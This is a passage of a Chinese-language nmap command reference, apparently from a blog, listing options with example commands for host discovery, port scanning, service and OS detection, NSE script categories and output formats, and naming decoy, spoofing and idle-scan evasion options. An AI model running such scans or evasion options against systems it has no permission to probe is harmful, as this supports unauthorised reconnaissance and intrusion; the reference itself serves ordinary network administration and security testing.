&lt;li&gt;&lt;a href="#--iflist"&gt;&lt;code&gt;--iflist&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--traceroute"&gt;&lt;code&gt;--traceroute&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#网络与dns配置"&gt;网络与DNS配置&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-n"&gt;&lt;code&gt;-n&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-r"&gt;&lt;code&gt;-R&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--system-dns"&gt;&lt;code&gt;--system-dns&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-e"&gt;&lt;code&gt;-e&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-6"&gt;&lt;code&gt;-6&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#性能与定时控制"&gt;性能与定时控制&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-t0-5"&gt;&lt;code&gt;-T&amp;lt;0-5&amp;gt;&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--min-rate"&gt;&lt;code&gt;--min-rate&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--max-rate"&gt;&lt;code&gt;--max-rate&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--scan-delay"&gt;&lt;code&gt;--scan-delay&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--min-parallelism----max-parallelism"&gt;&lt;code&gt;--min-parallelism&lt;/code&gt; / &lt;code&gt;--max-parallelism&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--max-retries"&gt;&lt;code&gt;--max-retries&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#防火墙ids规避与欺骗"&gt;防火墙/IDS规避与欺骗&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#-f-1"&gt;&lt;code&gt;-f&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#-d"&gt;&lt;code&gt;-D&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--source-port"&gt;&lt;code&gt;--source-port&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--data-length"&gt;&lt;code&gt;--data-length&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--ttl"&gt;&lt;code&gt;--ttl&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--spoof-mac"&gt;&lt;code&gt;--spoof-mac&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#--badsum"&gt;&lt;code&gt;--badsum&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#权限与运行模式"&gt;权限与运行模式&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#--privileged----unprivileged"&gt;&lt;code&gt;--privileged&lt;/code&gt; / &lt;code&gt;--unprivileged&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#附件--nmappdf"&gt;附件 nmap.pdf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h2 id="目标选择与管理"&gt;目标选择与管理
&lt;/h2&gt;&lt;h3 id="-il"&gt;&lt;code&gt;-iL&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定扫描主机列表&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -iL targets.txt&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;targets.txt&lt;/code&gt;内容示例：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;192.168.1.100
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;192.168.1.101
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;scanme.nmap.org
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-ir"&gt;&lt;code&gt;-iR&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：随机选择扫描目标。随机扫描10个IP地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -iR 10 -Pn&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--exclude"&gt;&lt;code&gt;--exclude&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：排除扫描目标&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap 192.168.1.0/24 --exclude 192.168.1.100,192.168.1.101&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--excludefile"&gt;&lt;code&gt;--excludefile&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：排除文件中目标列表&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap 192.168.1.0/24 --excludefile exclude.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--resume"&gt;&lt;code&gt;--resume&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：从上次中断的地方继续扫描。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --resume scan.log&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="主机发现与存活探测"&gt;主机发现与存活探测
&lt;/h2&gt;&lt;h3 id="-sn"&gt;&lt;code&gt;-sn&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测主机是否在线，不扫描端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sn 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-sp"&gt;&lt;code&gt;-sP&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：存活主机探测（已被&lt;code&gt;-sn&lt;/code&gt;取代）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sP 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-pn"&gt;&lt;code&gt;-Pn&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：跳过主机发现，将所有主机视为在线状态&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -Pn 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-ps"&gt;&lt;code&gt;-PS&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，TCP SYN ping扫描。向指定端口发送SYN包进行主机发现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PS 80,443 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-pa"&gt;&lt;code&gt;-PA&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，TCP ACK ping扫描。向指定端口发送ACK包，常用于穿透防火墙&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PA 80,443 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-pu"&gt;&lt;code&gt;-PU&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，UDP ping扫描。向目标UDP端口发送空包，根据响应判断主机是否在线&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PU 53,161 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-pi"&gt;&lt;code&gt;-PI&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，使用真正的ping ICMP echo请求扫描目标主机是否正在运行&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -PI 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-p0"&gt;&lt;code&gt;-P0&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号，无ping扫描。此参数已过时，使用&lt;code&gt;-Pn&lt;/code&gt;替代&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -P0 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="端口扫描技术"&gt;端口扫描技术
&lt;/h2&gt;&lt;h3 id="-ss"&gt;&lt;code&gt;-sS&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：TCP SYN半开扫描，相对隐蔽&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sS 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-st"&gt;&lt;code&gt;-sT&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：TCP全开扫描，建立完整的TCP链接，更容易被发现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sT -p- 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-su"&gt;&lt;code&gt;-sU&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：UDP端口扫描&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sU 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-sn-1"&gt;&lt;code&gt;-sN&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：TCP Null扫描，发送没有任何标志位的TCP包&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sN 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-sf"&gt;&lt;code&gt;-sF&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：TCP FIN扫描，发送FIN标志位的TCP包&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sF 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-sx"&gt;&lt;code&gt;-sX&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：TCP Xmas扫描，发送FIN、PSH和URG标志位的TCP包&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sX 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-si"&gt;&lt;code&gt;-sI&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：空闲扫描，通过“僵尸主机”进行隐蔽扫描&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sI zombiehost:port target&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="端口规范"&gt;端口规范
&lt;/h2&gt;&lt;h3 id="-p"&gt;&lt;code&gt;-p&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定端口号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -p 1-80 192.168.1.100&lt;/code&gt;、&lt;code&gt;nmap -p 80,443 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-p-"&gt;&lt;code&gt;-p-&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：扫描所有端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -p- 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--top-ports"&gt;&lt;code&gt;--top-ports&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：扫描最常用的前指定数量的端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --top-ports 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-f"&gt;&lt;code&gt;-F&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：快速扫描，减少扫描的端口数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -F 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="服务和版本探测"&gt;服务和版本探测
&lt;/h2&gt;&lt;h3 id="-sv"&gt;&lt;code&gt;-sV&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：识别服务类型（HTTP、FTP等）和服务版本号，获取详细服务信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sV 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--version-intensity"&gt;&lt;code&gt;--version-intensity&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定版本探测强度（0-9）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sV --version-intensity 9 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="操作系统探测"&gt;操作系统探测
&lt;/h2&gt;&lt;h3 id="-o"&gt;&lt;code&gt;-O&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测目标主机的操作系统类型&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -O 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-a"&gt;&lt;code&gt;-A&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：启用操作系统检测、版本检测、脚本扫描和路由追踪（聚合功能）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -A 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="nse-脚本引擎"&gt;NSE 脚本引擎
&lt;/h2&gt;&lt;h3 id="-sc----scriptdefault"&gt;&lt;code&gt;-sC&lt;/code&gt; / &lt;code&gt;--script=default&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用默认脚本进行扫描&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -sC 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-scriptlua-scripts"&gt;&lt;code&gt;-script=&amp;lt;Lua scripts&amp;gt;&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用某个或某类脚本进行扫描，支持通配符描述&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -script=vuln 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;脚本分类&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;auth&lt;/strong&gt;: 负责处理鉴权证书（绕开鉴权）的脚本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;broadcast&lt;/strong&gt;: 在局域网内探查更多服务开启状况，如dhcp/dns/sqlserver等服务&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;brute&lt;/strong&gt;: 提供暴力破解方式，针对常见的应用如http/snmp等&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;default&lt;/strong&gt;: 使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;discovery&lt;/strong&gt;: 对网络进行更多的信息，如SMB枚举、SNMP查询等&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;dos&lt;/strong&gt;: 用于进行拒绝服务攻击&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;exploit&lt;/strong&gt;: 利用已知的漏洞入侵系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;external&lt;/strong&gt;: 利用第三方的数据库或资源，例如进行whois解析&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;fuzzer&lt;/strong&gt;: 模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;intrusive&lt;/strong&gt;: 入侵性的脚本，此类脚本可能引发对方的IDS/IPS的记录或屏蔽&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;malware&lt;/strong&gt;: 探测目标机是否感染了病毒、开启了后门等信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;safe&lt;/strong&gt;: 此类与intrusive相反，属于安全性脚本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;version&lt;/strong&gt;: 负责增强服务与版本扫描（Version Detection）功能的脚本&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;vuln&lt;/strong&gt;: 负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-script-argsn1v1n2v2"&gt;&lt;code&gt;-script-args=&amp;lt;n1=v1,[n2=v2,...]&amp;gt;&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：为脚本提供默认参数，使用指定类别或脚本进行扫描&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --script http-title --script-args http.useragent=&amp;quot;Mozilla/5.0&amp;quot; 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="script-args-filefilename"&gt;&lt;code&gt;–script-args-file=filename&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用文件来为脚本提供参数&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --script smb-enum-shares --script-args-file smb-args.txt 192.168.1.100&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;smb-args.txt&lt;/code&gt;内容&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smbuser=admin
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;smbpass=password123
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="script-trace"&gt;&lt;code&gt;–script-trace&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：显示脚本执行过程中发送与接收的数据&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -O -script-trace 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="script-updatedb"&gt;&lt;code&gt;–script-updatedb&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：更新脚本数据库（root）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap –script-updatedb&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="script-helpscripts"&gt;&lt;code&gt;–script-help=&amp;lt;scripts&amp;gt;&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别。查看所有http漏洞相关脚本的帮助信息：&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -script-help http-vuln-*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="输出格式与详情"&gt;输出格式与详情
&lt;/h2&gt;&lt;h3 id="-on"&gt;&lt;code&gt;-oN&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：输出至普通文本文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -oN result.txt 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-ox"&gt;&lt;code&gt;-oX&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：输出至XML文件，便于工具处理&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -oX result.xml 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-oa"&gt;&lt;code&gt;-oA&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：一次性输出所有主要格式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -oA result 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--append-output"&gt;&lt;code&gt;--append-output&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：追加输出，追加到现有日志文件而不是覆盖。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -oN scan.log --append-output 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-v---vv---d---dd"&gt;&lt;code&gt;-v&lt;/code&gt; / &lt;code&gt;-vv&lt;/code&gt; / &lt;code&gt;-d&lt;/code&gt; / &lt;code&gt;-dd&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：详细/调试输出&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -v 192.168.1.100 # 详细输出
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -vv 192.168.1.100 # 更详细
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -d 192.168.1.100 # 调试级别1
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -dd 192.168.1.100 # 调试级别2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="扫描结果筛选与解释"&gt;扫描结果筛选与解释
&lt;/h2&gt;&lt;h3 id="--open"&gt;&lt;code&gt;--open&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：只显示开放端口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --open 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--reason"&gt;&lt;code&gt;--reason&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：显示端口状态原因。显示为什么端口被标记为开放/关闭/过滤。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --reason 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="调试与信息收集"&gt;调试与信息收集
&lt;/h2&gt;&lt;h3 id="--packet-trace"&gt;&lt;code&gt;--packet-trace&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：数据包跟踪，显示发送和接收的每个数据包。&lt;/li&gt;
